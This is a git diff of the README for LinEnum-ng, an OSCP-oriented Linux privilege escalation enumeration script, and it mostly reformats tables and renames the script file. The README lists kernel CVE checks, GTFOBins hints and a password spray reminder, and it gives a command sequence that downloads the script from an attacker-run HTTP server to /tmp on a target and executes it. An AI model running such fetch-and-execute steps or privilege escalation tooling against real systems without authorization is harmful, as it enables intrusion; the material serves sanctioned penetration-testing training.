@@ -1,7 +1,7 @@
 # LinEnum-ng
 
 > A focused, stable, OSCP-oriented Linux privilege escalation enumeration script.
-![LinEnum](https://github.com/user-attachments/assets/a702bc2c-dd14-4fba-927c-f8d505e5df2b)
+> ![LinEnum](https://github.com/user-attachments/assets/a702bc2c-dd14-4fba-927c-f8d505e5df2b)
 
 <p align="center">
   <img src="https://img.shields.io/badge/version-1.0.0-blue?style=for-the-badge" />
@@ -18,16 +18,16 @@ There are two well-known tools in this space: the original **LinEnum** and **lin
 
 LinEnum is the classic. It works, it's simple, and it's been around forever. But it's also showing its age:
 
-| | LinEnum | LinEnum-ng |
-|---|---|---|
-| Kernel CVE checks | ❌ None | ✅ PwnKit, Dirty Pipe, Dirty COW, Baron Samedit, eBPF, sudo CVEs |
-| SUID exploitation hints | ❌ Lists only | ✅ Cross-references full GTFOBins list with explanation |
-| Container detection | ⚠️ Docker only | ✅ Docker, LXC, **Kubernetes** (with token/API checks) |
-| Sudo with password | ⚠️ Interactive prompt | ✅ Pass via `-p` flag, non-interactive |
-| Username hunting | ❌ | ✅ `-u` flag: finds files by name and content |
-| Group privesc | ⚠️ Basic | ✅ Docker, LXD, disk, adm, shadow, video — each with exploitation steps |
-| Color output | ❌ | ✅ linPEAS-style color scheme |
-| Password spray hint | ❌ | ✅ Reminds you to try found passwords against all users |
+|                         | LinEnum               | LinEnum-ng                                                              |
+| ----------------------- | --------------------- | ----------------------------------------------------------------------- |
+| Kernel CVE checks       | ❌ None               | ✅ PwnKit, Dirty Pipe, Dirty COW, Baron Samedit, eBPF, sudo CVEs        |
+| SUID exploitation hints | ❌ Lists only         | ✅ Cross-references full GTFOBins list with explanation                 |
+| Container detection     | ⚠️ Docker only        | ✅ Docker, LXC, **Kubernetes** (with token/API checks)                  |
+| Sudo with password      | ⚠️ Interactive prompt | ✅ Pass via `-p` flag, non-interactive                                  |
+| Username hunting        | ❌                    | ✅ `-u` flag: finds files by name and content                           |
+| Group privesc           | ⚠️ Basic              | ✅ Docker, LXD, disk, adm, shadow, video — each with exploitation steps |
+| Color output            | ❌                    | ✅ linPEAS-style color scheme                                           |
+| Password spray hint     | ❌                    | ✅ Reminds you to try found passwords against all users                 |
 
 ### vs. linPEAS
 
@@ -35,7 +35,7 @@ linPEAS is powerful and actively maintained — arguably the most feature-rich L
 
 **linPEAS changes too much between versions.**
 
-If you've done enough OSCP boxes, you've hit this: a specific linPEAS version finds the vector immediately, then you update and the next version misses it entirely (happend to me on the exam), output restructured, noise level changed. 
+If you've done enough OSCP boxes, you've hit this: a specific linPEAS version finds the vector immediately, then you update and the next version misses it entirely (happend to me on the exam), output restructured, noise level changed.
 
 LinEnum-ng is intentionally stable and scoped. It covers exactly what the OSCP exam environment tends to test:
 
@@ -68,29 +68,29 @@ The output is clean, color-coded, and structured so you can triage top-to-bottom
 ## Usage
 
 ```bash
-./linenum-ng.sh [OPTIONS]
+./LinEnum-ng.sh [OPTIONS]
 ```
 
-| Option | Description |
-|--------|-------------|
-| `-p PASSWORD` | Supply a known password. Used for authenticated `sudo -l` and credential checks. |
+| Option        | Description                                                                               |
+| ------------- | ----------------------------------------------------------------------------------------- |
+| `-p PASSWORD` | Supply a known password. Used for authenticated `sudo -l` and credential checks.          |
 | `-u USERNAME` | Target a username. Hunts files named after or containing that user across the filesystem. |
-| `-h, --help` | Show help and usage examples. |
+| `-h, --help`  | Show help and usage examples.                                                             |
 
 ### Examples
 
 ```bash
 # Basic run — no credentials
-./linenum-ng.sh
+./LinEnum-ng.sh
 
 # Test sudo access with a found password
-./linenum-ng.sh -p 'Summer2024!'
+./LinEnum-ng.sh -p 'Summer2024!'
 
 # Hunt for files related to a specific user
-./linenum-ng.sh -u john
+./LinEnum-ng.sh -u john
 
 # Full run — password check + username hunt
-./linenum-ng.sh -p 'Summer2024!' -u john
+./LinEnum-ng.sh -p 'Summer2024!' -u john
 ```
 
 ---
@@ -122,14 +122,14 @@ The script runs top-to-bottom through these sections:
 
 ## Color Key
 
-| Color | Meaning |
-|-------|---------|
+| Color                             | Meaning                                                            |
+| --------------------------------- | ------------------------------------------------------------------ |
 | **Red text on yellow background** | Confirmed vulnerability or critical misconfiguration — act on this |
-| **Bright red** | Notable finding — group membership, sensitive file, writable path |
-| 🟡 Yellow | Section headers and informational prompts |
-| 🟢 Green | Clean / not vulnerable / check passed |
-| 🔵 Cyan | Raw command output and data values |
-| 🟣 Magenta | Exploitation steps, links, and remediation hints |
+| **Bright red**                    | Notable finding — group membership, sensitive file, writable path  |
+| 🟡 Yellow                         | Section headers and informational prompts                          |
+| 🟢 Green                          | Clean / not vulnerable / check passed                              |
+| 🔵 Cyan                           | Raw command output and data values                                 |
+| 🟣 Magenta                        | Exploitation steps, links, and remediation hints                   |
 
 ---
 
@@ -140,9 +140,9 @@ The script runs top-to-bottom through these sections:
 python3 -m http.server 8080
 
 # On target
-wget http://<your-ip>:8080/linenum-ng.sh -O /tmp/linenum-ng.sh
-chmod +x /tmp/linenum-ng.sh
-/tmp/linenum-ng.sh
+wget http://<your-ip>:8080/LinEnum-ng.sh -O /tmp/LinEnum-ng.sh
+chmod +x /tmp/LinEnum-ng.sh
+/tmp/LinEnum-ng.sh
 ```
 
 ### CTF Tip — No HTTP Server? Use a Heredoc
@@ -162,17 +162,17 @@ The single quotes around `'EOF'` are important — they prevent the shell from t
 
 ## Compared At a Glance
 
-| Feature | LinEnum | linPEAS | LinEnum-ng |
-|---------|---------|---------|------------|
-| Kernel CVE matching | ❌ | ✅ | ✅ |
-| GTFOBins SUID/sudo cross-ref | ❌ | ✅ | ✅ |
-| Kubernetes detection | ❌ | ✅ | ✅ |
-| Non-interactive `-p` flag | ⚠️ | ✅ | ✅ |
-| Username filesystem hunt | ❌ | ❌ | ✅ |
-| Password spray reminder & hints | ❌ | ❌ | ✅ |
-| Color output | ❌ | ✅ | ✅ |
-| Version stability | ✅ | ⚠️ Changes frequently | ✅ |
-| OSCP-scoped, no noise | ✅ | ⚠️ Very verbose | ✅ |
+| Feature                         | LinEnum | linPEAS               | LinEnum-ng |
+| ------------------------------- | ------- | --------------------- | ---------- |
+| Kernel CVE matching             | ❌      | ✅                    | ✅         |
+| GTFOBins SUID/sudo cross-ref    | ❌      | ✅                    | ✅         |
+| Kubernetes detection            | ❌      | ✅                    | ✅         |
+| Non-interactive `-p` flag       | ⚠️      | ✅                    | ✅         |
+| Username filesystem hunt        | ❌      | ❌                    | ✅         |
+| Password spray reminder & hints | ❌      | ❌                    | ✅         |
+| Color output                    | ❌      | ✅                    | ✅         |
+| Version stability               | ✅      | ⚠️ Changes frequently | ✅         |
+| OSCP-scoped, no noise           | ✅      | ⚠️ Very verbose       | ✅         |
 
 ---
 
@@ -180,4 +180,4 @@ The single quotes around `'EOF'` are important — they prevent the shell from t
 
 If LinEnum-ng helped you pop a shell, pass the OSCP, or saved you time on a CTF, consider leaving a star. It helps others find the tool and keeps the project going.
 
-*LinEnum-ng by [Strikoder](https://github.com/strikoder)*
+_LinEnum-ng by [Strikoder](https://github.com/strikoder)_
